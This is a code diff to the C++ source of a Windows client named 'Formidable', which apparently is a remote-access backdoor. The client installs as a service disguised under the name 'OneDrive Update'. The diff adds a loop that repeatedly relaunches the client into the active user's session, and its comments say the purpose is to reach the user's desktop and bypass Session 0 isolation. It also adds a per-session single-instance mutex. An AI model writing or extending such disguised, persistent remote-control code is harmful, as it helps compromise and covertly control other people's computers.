@@ -24,6 +24,7 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "wtsapi32.lib")
 
 using namespace Formidable;
 
@@ -40,9 +41,10 @@ void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {
         }
     }
 
+    static std::atomic<bool> bServiceRunning(true);
     SERVICE_STATUS_HANDLE hStatus = RegisterServiceCtrlHandlerW(serviceName.c_str(), [](DWORD dwCtrl) {
         if (dwCtrl == SERVICE_CONTROL_STOP || dwCtrl == SERVICE_CONTROL_SHUTDOWN) {
-            ExitProcess(0);
+            bServiceRunning = false;
         }
     });
 
@@ -51,22 +53,43 @@ void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {
         SetServiceStatus(hStatus, &status);
     }
 
-    // 在服务中启动主逻辑
-    std::atomic<bool> bShouldExit(false);
-    std::atomic<bool> bConnected(false);
+    // 在服务中，我们尝试在当前活跃用户会话中启动一个客户端实例
+    // 这样客户端就可以访问用户桌面、绕过 Session 0 隔离
+    wchar_t szPath[MAX_PATH];
+    GetModuleFileNameW(NULL, szPath, MAX_PATH);
     
-    // Formidable::Client::Utils::Logger::Init("client_svc.log");
-    Formidable::Client::Core::AutomationManager::Initialize();
-    Formidable::Client::Core::AutomationManager::Start();
+    // 启动一个监控循环
+    while (bServiceRunning) {
+        if (IsUserSessionActive()) {
+            // 尝试在用户会话启动实例
+            //Mutex 已经在 WinMain 处理，所以这里启动后如果已存在会自退出
+            LaunchInUserSession(szPath);
+        }
+        
+        // 每10秒检查一次
+        for (int i = 0; i < 100 && bServiceRunning; ++i) {
+            Sleep(100);
+        }
+    }
 
-    RunClientLoop(bShouldExit, bConnected);
-
-    Formidable::Client::Core::AutomationManager::Stop();
-    Formidable::Client::Utils::Logger::Close();
+    if (hStatus) {
+        SERVICE_STATUS status = { SERVICE_WIN32_OWN_PROCESS, SERVICE_STOPPED, 0 };
+        SetServiceStatus(hStatus, &status);
+    }
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     InitClientCore();
+
+    // 确保每个会话只有一个实例运行
+    DWORD sessionId = 0;
+    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
+    std::wstring mutexName = L"Global\\FormidableClient_Session_" + std::to_wstring(sessionId);
+    HANDLE hMutex = CreateMutexW(NULL, TRUE, mutexName.c_str());
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        if (hMutex) CloseHandle(hMutex);
+        return 0;
+    }
 
     // 检查是否作为服务启动
     std::wstring serviceName = L"OneDrive Update";
